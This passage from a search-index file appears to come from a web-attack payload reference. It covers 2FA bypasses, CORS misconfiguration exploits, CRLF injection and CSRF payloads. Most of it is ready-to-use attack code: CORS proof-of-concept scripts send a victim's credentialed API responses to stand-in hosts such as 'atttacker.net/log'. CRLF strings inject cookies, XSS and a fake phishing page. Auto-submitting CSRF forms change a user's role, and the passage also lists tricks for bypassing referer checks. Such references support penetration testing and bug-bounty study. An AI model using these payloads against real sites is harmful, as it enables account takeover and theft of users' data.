2FA, also there is no auth confirmation","title":"CSRF on 2FA Disabling"},{"location":"Account%20Takeover/#password-reset-disable-2fa","text":"2FA gets disabled on password change/email change","title":"Password Reset Disable 2FA"},{"location":"Account%20Takeover/#backup-code-abuse","text":"Bypassing 2FA by abusing the Backup code feature Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions","title":"Backup Code Abuse"},{"location":"Account%20Takeover/#clickjacking-on-2fa-disabling-page","text":"Iframing the 2FA Disabling page and social engineering victim to disable the 2FA","title":"Clickjacking on 2FA Disabling Page"},{"location":"Account%20Takeover/#enabling-2fa-doesnt-expire-previously-active-sessions","text":"If the session is already hijacked and there is a session timeout vuln","title":"Enabling 2FA doesn't expire Previously active Sessions"},{"location":"Account%20Takeover/#bypass-2fa-with-null-or-000000","text":"Enter the code 000000 or null to bypass 2FA protection.","title":"Bypass 2FA with null or 000000"},{"location":"Account%20Takeover/#bypass-2fa-with-array","text":"{ \"otp\":[ \"1234\", \"1111\", \"1337\", // GOOD OTP \"2222\", \"3333\", \"4444\", \"5555\" ] }","title":"Bypass 2FA with array"},{"location":"Account%20Takeover/#todo","text":"Broken cryptography Session hijacking OAuth misconfiguration","title":"TODO"},{"location":"Account%20Takeover/#references","text":"10 Password Reset Flaws - Anugrah SR $6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020 Hacking Grindr Accounts with Copy and Paste - Troy HUNT & Wassime BOUIMADAGHENE - 03 OCTOBER 2020 CTFd Account Takeover","title":"References"},{"location":"CORS%20Misconfiguration/","text":"CORS Misconfiguration A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker\u2019s site using the victim\u2019s credentials. Summary Tools Prerequisites Exploitation References Tools Corsy - CORS Misconfiguration Scanner PostMessage POC Builder - @honoki Prerequisites BURP HEADER> Origin: https://evil.com VICTIM HEADER> Access-Control-Allow-Credential: true VICTIM HEADER> Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: null Exploitation Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint . Vulnerable Example: Origin Reflection Vulnerable Implementation GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {\"[private API key]\"} Proof of concept This PoC requires that the respective JS script is hosted at evil.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; }; or <html> <body> <h2>CORS PoC</h2> <div id=\"demo\"> <button type=\"button\" onclick=\"cors()\">Exploit</button> </div> <script> function cors() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"demo\").innerHTML = alert(this.responseText); } }; xhr.open(\"GET\", \"https://victim.example.com/endpoint\", true); xhr.withCredentials = true; xhr.send(); } </script> </body> </html> Vulnerable Example: Null Origin Vulnerable Implementation It's possible that the server does not reflect the complete Origin header but that the null origin is allowed. This would look like this in the server's response: GET /endpoint HTTP/1.1 Host: victim.example.com Origin: null Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true {\"[private API key]\"} Proof of concept This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the null origin in the request: <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText); }; </script>\"></iframe> Vulnerable Example: XSS on Trusted Origin If the application does implement a strict whitelist of allowed origins, the exploit codes from above do not work. But if you have an XSS on a trusted origin, you can inject the exploit coded from above in order to exploit CORS again. https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script> Vulnerable Example: Wildcard Origin * without Credentials If the server responds with a wildcard origin * , the browser does never send the cookies . However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication. * is the only wildcard origin https://*.example.com is not valid Vulnerable Implementation GET /endpoint HTTP/1.1 Host: api.internal.example.com Origin: https://evil.com HTTP/1.1 200 OK Access-Control-Allow-Origin: * {\"[private API key]\"} Proof of concept var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.internal.example.com/endpoint',true); req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; }; Vulnerable Example: Expanding the Origin / Regex Issues Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header. Vulnerable Implementation (Example 1) In this scenario any prefix inserted in front of example.com will be accepted by the server. GET /endpoint HTTP/1.1 Host: api.example.com Origin: https://evilexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evilexample.com Access-Control-Allow-Credentials: true {\"[private API key]\"} Proof of concept (Example 1) This PoC requires the respective JS script to be hosted at evilexample.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; }; Vulnerable Implementation (Example 2) In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: ^api.example.com$ instead of ^api\\.example.com$ . Thus, the dot can be replaced with any letter to gain access from a third-party domain. GET /endpoint HTTP/1.1 Host: api.example.com Origin: https://apiiexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://apiiexample.com Access-Control-Allow-Credentials: true {\"[private API key]\"} Proof of concept (Example 2) This PoC requires the respective JS script to be hosted at apiiexample.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; }; Bug Bounty reports CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg) Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) [\u2588\u2588\u2588\u2588\u2588\u2588] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) References Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019 Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016 Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016 Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018 PortSwigger Web Security Academy: CORS CORS Misconfigurations Explained - Detectify Blog","title":"CORS Misconfiguration"},{"location":"CORS%20Misconfiguration/#cors-misconfiguration","text":"A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker\u2019s site using the victim\u2019s credentials.","title":"CORS Misconfiguration"},{"location":"CORS%20Misconfiguration/#summary","text":"Tools Prerequisites Exploitation References","title":"Summary"},{"location":"CORS%20Misconfiguration/#tools","text":"Corsy - CORS Misconfiguration Scanner PostMessage POC Builder - @honoki","title":"Tools"},{"location":"CORS%20Misconfiguration/#prerequisites","text":"BURP HEADER> Origin: https://evil.com VICTIM HEADER> Access-Control-Allow-Credential: true VICTIM HEADER> Access-Control-Allow-Origin: https://evil.com OR Access-Control-Allow-Origin: null","title":"Prerequisites"},{"location":"CORS%20Misconfiguration/#exploitation","text":"Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target https://victim.example.com/endpoint .","title":"Exploitation"},{"location":"CORS%20Misconfiguration/#vulnerable-example-origin-reflection","text":"","title":"Vulnerable Example: Origin Reflection"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation","text":"GET /endpoint HTTP/1.1 Host: victim.example.com Origin: https://evil.com Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evil.com Access-Control-Allow-Credentials: true {\"[private API key]\"}","title":"Vulnerable Implementation"},{"location":"CORS%20Misconfiguration/#proof-of-concept","text":"This PoC requires that the respective JS script is hosted at evil.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; }; or <html> <body> <h2>CORS PoC</h2> <div id=\"demo\"> <button type=\"button\" onclick=\"cors()\">Exploit</button> </div> <script> function cors() { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { document.getElementById(\"demo\").innerHTML = alert(this.responseText); } }; xhr.open(\"GET\", \"https://victim.example.com/endpoint\", true); xhr.withCredentials = true; xhr.send(); } </script> </body> </html>","title":"Proof of concept"},{"location":"CORS%20Misconfiguration/#vulnerable-example-null-origin","text":"","title":"Vulnerable Example: Null Origin"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation_1","text":"It's possible that the server does not reflect the complete Origin header but that the null origin is allowed. This would look like this in the server's response: GET /endpoint HTTP/1.1 Host: victim.example.com Origin: null Cookie: sessionid=... HTTP/1.1 200 OK Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true {\"[private API key]\"}","title":"Vulnerable Implementation"},{"location":"CORS%20Misconfiguration/#proof-of-concept_1","text":"This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the null origin in the request: <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, <script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText); }; </script>\"></iframe>","title":"Proof of concept"},{"location":"CORS%20Misconfiguration/#vulnerable-example-xss-on-trusted-origin","text":"If the application does implement a strict whitelist of allowed origins, the exploit codes from above do not work. But if you have an XSS on a trusted origin, you can inject the exploit coded from above in order to exploit CORS again. https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>","title":"Vulnerable Example: XSS on Trusted Origin"},{"location":"CORS%20Misconfiguration/#vulnerable-example-wildcard-origin-without-credentials","text":"If the server responds with a wildcard origin * , the browser does never send the cookies . However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then pivot into the internal network and access the server's data without authentication. * is the only wildcard origin https://*.example.com is not valid","title":"Vulnerable Example: Wildcard Origin * without Credentials"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation_2","text":"GET /endpoint HTTP/1.1 Host: api.internal.example.com Origin: https://evil.com HTTP/1.1 200 OK Access-Control-Allow-Origin: * {\"[private API key]\"}","title":"Vulnerable Implementation"},{"location":"CORS%20Misconfiguration/#proof-of-concept_2","text":"var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.internal.example.com/endpoint',true); req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; };","title":"Proof of concept"},{"location":"CORS%20Misconfiguration/#vulnerable-example-expanding-the-origin-regex-issues","text":"Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.","title":"Vulnerable Example: Expanding the Origin / Regex Issues"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation-example-1","text":"In this scenario any prefix inserted in front of example.com will be accepted by the server. GET /endpoint HTTP/1.1 Host: api.example.com Origin: https://evilexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://evilexample.com Access-Control-Allow-Credentials: true {\"[private API key]\"}","title":"Vulnerable Implementation (Example 1)"},{"location":"CORS%20Misconfiguration/#proof-of-concept-example-1","text":"This PoC requires the respective JS script to be hosted at evilexample.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; };","title":"Proof of concept (Example 1)"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation-example-2","text":"In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: ^api.example.com$ instead of ^api\\.example.com$ . Thus, the dot can be replaced with any letter to gain access from a third-party domain. GET /endpoint HTTP/1.1 Host: api.example.com Origin: https://apiiexample.com HTTP/1.1 200 OK Access-Control-Allow-Origin: https://apiiexample.com Access-Control-Allow-Credentials: true {\"[private API key]\"}","title":"Vulnerable Implementation (Example 2)"},{"location":"CORS%20Misconfiguration/#proof-of-concept-example-2","text":"This PoC requires the respective JS script to be hosted at apiiexample.com var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true; req.send(); function reqListener() { location='//atttacker.net/log?key='+this.responseText; };","title":"Proof of concept (Example 2)"},{"location":"CORS%20Misconfiguration/#bug-bounty-reports","text":"CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg) Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) [\u2588\u2588\u2588\u2588\u2588\u2588] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)","title":"Bug Bounty reports"},{"location":"CORS%20Misconfiguration/#references","text":"Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019 Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016 Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016 Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018 PortSwigger Web Security Academy: CORS CORS Misconfigurations Explained - Detectify Blog","title":"References"},{"location":"CRLF%20Injection/","text":"CRLF The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They're used to note the termination of a line, however, dealt with differently in today\u2019s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line. A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL. Summary CRLF - Add a cookie CRLF - Add a cookie - XSS Bypass CRLF - Write HTML CRLF - Filter Bypass References CRLF - Add a cookie Requested page http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue HTTP Response Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Mon, 09 May 2016 14:47:29 GMT Location: https://www.example.net/[INJECTION STARTS HERE] Set-Cookie: mycookie=myvalue X-Frame-Options: SAMEORIGIN X-Sucuri-ID: 15016 x-content-type-options: nosniff x-xss-protection: 1; mode=block CRLF - Add a cookie - XSS Bypass Requested page http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e HTTP Response HTTP/1.1 200 OK Date: Tue, 20 Dec 2016 14:34:03 GMT Content-Type: text/html; charset=utf-8 Content-Length: 22907 Connection: close X-Frame-Options: SAMEORIGIN Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT ETag: \"842fe-597b-54415a5c97a80\" Vary: Accept-Encoding X-UA-Compatible: IE=edge Server: NetDNA-cache/2.2 Link: <https://example.com/[INJECTION STARTS HERE] Content-Length:35 X-XSS-Protection:0 23 <svg onload=alert(document.domain)> 0 CRLF - Write HTML Requested page http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E HTTP response Set-Cookie:en Content-Length: 0 HTTP/1.1 200 OK Content-Type: text/html Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT Content-Length: 34 <html>You have been Phished</html> CRLF - Filter Bypass Using UTF-8 encoding %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE Remainder: %E5%98%8A = %0A = \\u560a %E5%98%8D = %0D = \\u560d %E5%98%BE = %3E = \\u563e (>) %E5%98%BC = %3C = \\u563c (<) Exploitation Tricks Try to search for parameters that lead to redirects and fuzz them Also test the mobile version of the website, sometimes it is different or uses a different backend References https://www.owasp.org/index.php/CRLF_Injection https://vulners.com/hackerone/H1:192749","title":"CRLF"},{"location":"CRLF%20Injection/#crlf","text":"The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They're used to note the termination of a line, however, dealt with differently in today\u2019s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line. A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.","title":"CRLF"},{"location":"CRLF%20Injection/#summary","text":"CRLF - Add a cookie CRLF - Add a cookie - XSS Bypass CRLF - Write HTML CRLF - Filter Bypass References","title":"Summary"},{"location":"CRLF%20Injection/#crlf-add-a-cookie","text":"Requested page http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue HTTP Response Connection: keep-alive Content-Length: 178 Content-Type: text/html Date: Mon, 09 May 2016 14:47:29 GMT Location: https://www.example.net/[INJECTION STARTS HERE] Set-Cookie: mycookie=myvalue X-Frame-Options: SAMEORIGIN X-Sucuri-ID: 15016 x-content-type-options: nosniff x-xss-protection: 1; mode=block","title":"CRLF - Add a cookie"},{"location":"CRLF%20Injection/#crlf-add-a-cookie-xss-bypass","text":"Requested page http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e HTTP Response HTTP/1.1 200 OK Date: Tue, 20 Dec 2016 14:34:03 GMT Content-Type: text/html; charset=utf-8 Content-Length: 22907 Connection: close X-Frame-Options: SAMEORIGIN Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT ETag: \"842fe-597b-54415a5c97a80\" Vary: Accept-Encoding X-UA-Compatible: IE=edge Server: NetDNA-cache/2.2 Link: <https://example.com/[INJECTION STARTS HERE] Content-Length:35 X-XSS-Protection:0 23 <svg onload=alert(document.domain)> 0","title":"CRLF - Add a cookie - XSS Bypass"},{"location":"CRLF%20Injection/#crlf-write-html","text":"Requested page http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E HTTP response Set-Cookie:en Content-Length: 0 HTTP/1.1 200 OK Content-Type: text/html Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT Content-Length: 34 <html>You have been Phished</html>","title":"CRLF - Write HTML"},{"location":"CRLF%20Injection/#crlf-filter-bypass","text":"Using UTF-8 encoding %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE Remainder: %E5%98%8A = %0A = \\u560a %E5%98%8D = %0D = \\u560d %E5%98%BE = %3E = \\u563e (>) %E5%98%BC = %3C = \\u563c (<)","title":"CRLF - Filter Bypass"},{"location":"CRLF%20Injection/#exploitation-tricks","text":"Try to search for parameters that lead to redirects and fuzz them Also test the mobile version of the website, sometimes it is different or uses a different backend","title":"Exploitation Tricks"},{"location":"CRLF%20Injection/#references","text":"https://www.owasp.org/index.php/CRLF_Injection https://vulners.com/hackerone/H1:192749","title":"References"},{"location":"CSRF%20Injection/","text":"Cross-Site Request Forgery Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP Summary Methodology Payloads HTML GET - Requiring User Interaction HTML GET - No User Interaction) HTML POST - Requiring User Interaction HTML POST - AutoSubmit - No User Interaction HTML POST - multipart/form-data with file upload - Requiring User Interaction JSON GET - Simple Request JSON POST - Simple Request JSON POST - Complex Request Bypass referer header validation check Basic payload With question mark payload With semicolon payload With subdomain payload References Tools XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit. Methodology Payloads When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it. HTML GET - Requiring User Interaction <a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a> HTML GET - No User Interaction <img src=\"http://www.example.com/api/setusername?username=CSRFd\"> HTML POST - Requiring User Interaction <form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"> <input name=\"username\" type=\"hidden\" value=\"CSRFd\" /> <input type=\"submit\" value=\"Submit Request\" /> </form> HTML POST - AutoSubmit - No User Interaction <form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"> <input name=\"username\" type=\"hidden\" value=\"CSRFd\" /> <input type=\"submit\" value=\"Submit Request\" /> </form> <script> document.getElementById(\"autosubmit\").submit(); </script> HTML POST - multipart/form-data with file upload - Requiring User Interaction <script> function launch(){ const dT = new DataTransfer(); const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" ); dT.items.add( file ); document.xss[0].files = dT.files; document.xss.submit() } </script> <form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\"> <input id=\"file\" type=\"file\" name=\"file\"/> <input type=\"submit\" name=\"\" value=\"\" size=\"0\" /> </form> <button value=\"button\" onclick=\"launch()\">Submit Request</button> JSON GET - Simple Request <script> var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://www.example.com/api/currentuser\"); xhr.send(); </script> JSON POST - Simple Request <script> var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); //application/json is not allowed in a simple request. text/plain is the default xhr.setRequestHeader(\"Content-Type\", \"text/plain\"); //You will probably want to also try one or both of these //xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); //xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\"); xhr.send('{\"role\":admin}'); </script> JSON POST - Complex Request <script> var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); xhr.withCredentials = true; xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\"); xhr.send('{\"role\":admin}'); </script> Bypass referer header validation Basic payload 1) Open https://attacker.com/csrf.html 2) Referer header is .. Referer: https://attacker.com/csrf.html With question mark( ? ) payload 1) Open https://attacker.com/csrf.html?trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html?trusted.domain.com With semicolon( ; ) payload 1) Open https://attacker.com/csrf.html;trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html;trusted.domain.com With subdomain payload 1) Open https://trusted.domain.com.attacker.com/csrf.html 2) Referer headers is .. Referer: https://trusted.domain.com.attacker.com/csrf.html References Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016 Cross-Site Request Forgery (CSRF) - OWASP Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial Hacking PayPal Accounts with one click (Patched) - Yasser Ali Add tweet to collection CSRF - vijay kumar Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones Hacking Facebook accounts using CSRF in Oculus-Facebook integration Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019 Cross-Site Request Forgery Attack - PwnFunction Wiping Out CSRF - Joe Rozner - Oct 17, 2017 Bypass referer check logic for CSRF","title":"Cross-Site Request Forgery"},{"location":"CSRF%20Injection/#cross-site-request-forgery","text":"Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP","title":"Cross-Site Request Forgery"},{"location":"CSRF%20Injection/#summary","text":"Methodology Payloads HTML GET - Requiring User Interaction HTML GET - No User Interaction) HTML POST - Requiring User Interaction HTML POST - AutoSubmit - No User Interaction HTML POST - multipart/form-data with file upload - Requiring User Interaction JSON GET - Simple Request JSON POST - Simple Request JSON POST - Complex Request Bypass referer header validation check Basic payload With question mark payload With semicolon payload With subdomain payload References","title":"Summary"},{"location":"CSRF%20Injection/#tools","text":"XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.","title":"Tools"},{"location":"CSRF%20Injection/#methodology","text":"","title":"Methodology"},{"location":"CSRF%20Injection/#payloads","text":"When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.","title":"Payloads"},{"location":"CSRF%20Injection/#html-get-requiring-user-interaction","text":"<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>","title":"HTML GET - Requiring User Interaction"},{"location":"CSRF%20Injection/#html-get-no-user-interaction","text":"<img src=\"http://www.example.com/api/setusername?username=CSRFd\">","title":"HTML GET - No User Interaction"},{"location":"CSRF%20Injection/#html-post-requiring-user-interaction","text":"<form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"> <input name=\"username\" type=\"hidden\" value=\"CSRFd\" /> <input type=\"submit\" value=\"Submit Request\" /> </form>","title":"HTML POST - Requiring User Interaction"},{"location":"CSRF%20Injection/#html-post-autosubmit-no-user-interaction","text":"<form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"> <input name=\"username\" type=\"hidden\" value=\"CSRFd\" /> <input type=\"submit\" value=\"Submit Request\" /> </form> <script> document.getElementById(\"autosubmit\").submit(); </script>","title":"HTML POST - AutoSubmit - No User Interaction"},{"location":"CSRF%20Injection/#html-post-multipartform-data-with-file-upload-requiring-user-interaction","text":"<script> function launch(){ const dT = new DataTransfer(); const file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" ); dT.items.add( file ); document.xss[0].files = dT.files; document.xss.submit() } </script> <form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\"> <input id=\"file\" type=\"file\" name=\"file\"/> <input type=\"submit\" name=\"\" value=\"\" size=\"0\" /> </form> <button value=\"button\" onclick=\"launch()\">Submit Request</button>","title":"HTML POST - multipart/form-data with file upload - Requiring User Interaction"},{"location":"CSRF%20Injection/#json-get-simple-request","text":"<script> var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://www.example.com/api/currentuser\"); xhr.send(); </script>","title":"JSON GET - Simple Request"},{"location":"CSRF%20Injection/#json-post-simple-request","text":"<script> var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); //application/json is not allowed in a simple request. text/plain is the default xhr.setRequestHeader(\"Content-Type\", \"text/plain\"); //You will probably want to also try one or both of these //xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); //xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\"); xhr.send('{\"role\":admin}'); </script>","title":"JSON POST - Simple Request"},{"location":"CSRF%20Injection/#json-post-complex-request","text":"<script> var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"http://www.example.com/api/setrole\"); xhr.withCredentials = true; xhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\"); xhr.send('{\"role\":admin}'); </script>","title":"JSON POST - Complex Request"},{"location":"CSRF%20Injection/#bypass-referer-header-validation","text":"","title":"Bypass referer header validation"},{"location":"CSRF%20Injection/#basic-payload","text":"1) Open https://attacker.com/csrf.html 2) Referer header is .. Referer: https://attacker.com/csrf.html","title":"Basic payload"},{"location":"CSRF%20Injection/#with-question-mark-payload","text":"1) Open https://attacker.com/csrf.html?trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html?trusted.domain.com","title":"With question mark(?) payload"},{"location":"CSRF%20Injection/#with-semicolon-payload","text":"1) Open https://attacker.com/csrf.html;trusted.domain.com 2) Referer header is .. Referer: https://attacker.com/csrf.html;trusted.domain.com","title":"With semicolon(;) payload"},{"location":"CSRF%20Injection/#with-subdomain-payload","text":"1) Open https://trusted.domain.com.attacker.com/csrf.html 2) Referer headers is .. Referer: https://trusted.domain.com.attacker.com/csrf.html","title":"With subdomain payload"},{"location":"CSRF%20Injection/#references","text":"Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016 Cross-Site Request Forgery (CSRF) - OWASP Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton Paypal bug bounty: Updating the Paypal.me profile picture without consent 